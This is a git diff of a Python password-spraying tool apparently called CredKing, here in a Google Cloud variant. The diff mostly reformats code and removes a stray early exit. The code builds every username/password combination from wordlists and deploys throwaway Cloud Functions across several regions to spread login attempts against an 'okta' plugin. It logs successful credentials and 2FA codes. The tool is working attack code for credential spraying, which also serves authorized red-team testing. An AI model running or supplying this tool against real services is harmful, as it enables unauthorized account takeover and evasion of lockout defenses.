@@ -6,9 +6,9 @@ from time import time
 from concurrent.futures import ThreadPoolExecutor
 from pprint import pprint
 from threading import Lock, Thread
-lock = Lock()
 import json, sys, random, string, ntpath, time, os, datetime, queue, shutil
 import re, argparse, importlib
+
 _service_account_email = ""
 credentials = {'accounts': []}
 
@@ -16,7 +16,7 @@ lock = Lock()
 q = queue.Queue()
 
 
-def main(args,pargs):
+def main(args, pargs):
     global start_time, end_time, time_lapse
 
     thread_count = args.threads
@@ -24,10 +24,8 @@ def main(args,pargs):
     username_file = args.userfile
     password_file = args.passwordfile
     sa_file = args.sa_creds_file
-    useragent_file = args.useragentfile
+    user_agent_file = args.useragentfile
     print(args.env)
-    sys.exit(0)
-
 
     pluginargs = {}
     for i in range(0, len(pargs) - 1):
@@ -38,7 +36,7 @@ def main(args,pargs):
     log_entry('Execution started at: {}'.format(start_time))
 
     # Prepare credential combinations into the queue
-    load_credentials(username_file, password_file, useragent_file)
+    load_credentials(username_file, password_file, user_agent_file)
 
     # Check with plugin to make sure it has the data that it needs
     validator = importlib.import_module('plugins.{}'.format(plugin))
@@ -50,9 +48,9 @@ def main(args,pargs):
     else:
         log_entry("No validate function found for plugin: {}".format(plugin))
 
-
-    #sa_file = 'service-account.json'
     sa_credentials = service_account.Credentials.from_service_account_file(sa_file)
+    # TODO: Evaluate if this variable is needed
+    global _service_account_email
     _service_account_email = sa_credentials.service_account_email
 
     service = build('cloudfunctions', 'v1', credentials=sa_credentials)
@@ -69,13 +67,13 @@ def main(args,pargs):
     # Uploading a file from a created bucket
     storage_client = storage.Client(project=sa_credentials.project_id, credentials=sa_credentials)
     bucket = storage_client.bucket(bucket_name)
-    source_url = create_bucket(bucket,'okta')
+    source_url = create_bucket(bucket, 'okta')
 
     locations = service.projects().locations()
-    functions = create_functions(sa_credentials,locations,sa_credentials.project_id,source_url,thread_count)
+    functions = create_functions(sa_credentials, locations, sa_credentials.project_id, source_url, thread_count)
 
     for x in functions:
-        check_function(locations.functions(),x)
+        check_function(locations.functions(), x)
 
     with ThreadPoolExecutor(max_workers=len(functions)) as executor:
         for function_name in functions:
@@ -92,7 +90,8 @@ def main(args,pargs):
     delete_bucket(bucket)
     delete_zip()
 
-def start_spray(sa_credentials,function_name,args):
+
+def start_spray(sa_credentials, function_name, args):
     service = build('cloudfunctions', 'v1', credentials=sa_credentials)
     function = service.projects().locations().functions()
     while True:
@@ -108,43 +107,43 @@ def start_spray(sa_credentials,function_name,args):
         payload['args'] = args
         body = {"data": json.dumps(payload)}
 
-        invoke_function(function,function_name,body)
+        invoke_function(function, function_name, body)
 
         q.task_done()
 
 
-def load_credentials(user_file, password_file,useragent_file=None):
-	log_entry('Loading credentials from {} and {}'.format(user_file, password_file))
+def load_credentials(user_file, password_file, useragent_file=None):
+    log_entry('Loading credentials from {} and {}'.format(user_file, password_file))
 
-	users = load_file(user_file)
-	passwords = load_file(password_file)
-	if useragent_file is not None:
-		useragents = load_file(useragent_file)
-	else:
-		useragents = ["Python CredKing (https://github.com/ustayready/CredKing)"]
+    users = load_file(user_file)
+    passwords = load_file(password_file)
+    if useragent_file is not None:
+        useragents = load_file(useragent_file)
+    else:
+        useragents = ["Python CredKing (https://github.com/ustayready/CredKing)"]
 
-	for user in users:
-		for password in passwords:
-			cred = {}
-			cred['username'] = user
-			cred['password'] = password
-			cred['useragent'] = random.choice(useragents)
-			credentials['accounts'].append(cred)
+    for user in users:
+        for password in passwords:
+            cred = {}
+            cred['username'] = user
+            cred['password'] = password
+            cred['useragent'] = random.choice(useragents)
+            credentials['accounts'].append(cred)
 
-	for cred in credentials['accounts']:
-		q.put(cred)
+    for cred in credentials['accounts']:
+        q.put(cred)
 
 
 def load_file(filename):
-	if filename:
-		return [line.strip() for line in open(filename, 'r')]
+    if filename:
+        return [line.strip() for line in open(filename, 'r')]
 
 
-def create_functions(sa_credentials,locations,project_id,source_url,thread_count):
+def create_functions(sa_credentials, locations, project_id, source_url, thread_count):
     # Get Locations
     locations_response = locations.list(name=f'projects/{project_id}').execute()
-    location_names = ["us-central1","us-east1","us-east4","europe-west1","asia-east2"]
-    #log_entry(len(locations_response['locations']))
+    location_names = ["us-central1", "us-east1", "us-east4", "europe-west1", "asia-east2"]
+    # log_entry(len(locations_response['locations']))
     log_entry(len(location_names))
     # print(json.dumps(locations,indent=2))
     threads = thread_count
@@ -157,7 +156,7 @@ def create_functions(sa_credentials,locations,project_id,source_url,thread_count
     function_names = []
     function = locations.functions()
     with ThreadPoolExecutor(max_workers=threads) as executor:
-        for x in range(0,threads):
+        for x in range(0, threads):
             function_names.append(
                 executor.submit(
                     create_function,
@@ -209,7 +208,7 @@ def create_zip(plugin):
     return build_zip
 
 
-def create_bucket(bucket,plugin):
+def create_bucket(bucket, plugin):
     path = create_zip(plugin)
     blob = bucket.blob('test.zip')
     blob.upload_from_filename(path)
@@ -217,7 +216,7 @@ def create_bucket(bucket,plugin):
     return object_url
 
 
-def create_function(sa_credentials, project_id, source_url,location):
+def create_function(sa_credentials, project_id, source_url, location):
     service = build('cloudfunctions', 'v1', credentials=sa_credentials)
     # Calling the create function command
     log_entry(location)
@@ -229,28 +228,28 @@ def create_function(sa_credentials, project_id, source_url,location):
     log_entry(f"Creating Function: {function_name}")
 
     # Create Function
-    body =  {
-            "name" : function_name,
-            "availableMemoryMb": 128,
-            "entryPoint": "lambda_handler",
-            "description": "CredKing Function",
-            "timeout": "60s",
-            "runtime": "python37",
-            "ingressSettings": "ALLOW_ALL",
-            "maxInstances": 1,
-            "sourceArchiveUrl": source_url,
-            "httpsTrigger": {},
-            "vpcConnector": "",
-            "serviceAccountEmail": _service_account_email
-            }
+    body = {
+        "name": function_name,
+        "availableMemoryMb": 128,
+        "entryPoint": "lambda_handler",
+        "description": "CredKing Function",
+        "timeout": "60s",
+        "runtime": "python37",
+        "ingressSettings": "ALLOW_ALL",
+        "maxInstances": 1,
+        "sourceArchiveUrl": source_url,
+        "httpsTrigger": {},
+        "vpcConnector": "",
+        "serviceAccountEmail": _service_account_email
+    }
     function = service.projects().locations().functions()
-    function_resp = function.create(location=location_name,body=body).execute()
+    function_resp = function.create(location=location_name, body=body).execute()
     log_entry(f"Function Resp: {function_resp}")
 
     return function_name
 
 
-def invoke_function(function,function_name,payload):
+def invoke_function(function, function_name, payload):
     response = function.call(name=function_name, body=payload).execute()
     return_payload = json.loads(response['result'])
 
@@ -258,13 +257,13 @@ def invoke_function(function,function_name,payload):
     code_2fa = return_payload['code']
     if return_payload['success']:
         # TODO: Add this back in when iterating
-        #clear_credentials(user, password)
+        # clear_credentials(user, password)
         log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
     else:
         log_entry('(FAILED) {} / {} -> Failed.'.format(user, password))
 
 
-def delete_function(function,function_name):
+def delete_function(function, function_name):
     # Delete Function
     log_entry(function.delete(name=function_name).execute())
 
@@ -278,7 +277,7 @@ def delete_bucket(bucket):
 
 def delete_zip():
     # Delete Zip
-    file_list = [ f for f in os.listdir('build') if f.endswith(".zip") ]
+    file_list = [f for f in os.listdir('build') if f.endswith(".zip")]
     for f in file_list:
         os.remove(os.path.join('build', f))
         log_entry(f"Removing file {f}")
@@ -304,5 +303,5 @@ if __name__ == '__main__':
     # GCP Environment Required Fields
     parser.add_argument('--sa_creds_file', help="GCP Json Keys", required=False)
 
-    args,plugin_args = parser.parse_known_args()
-    main(args,plugin_args)
+    args, plugin_args = parser.parse_known_args()
+    main(args, plugin_args)
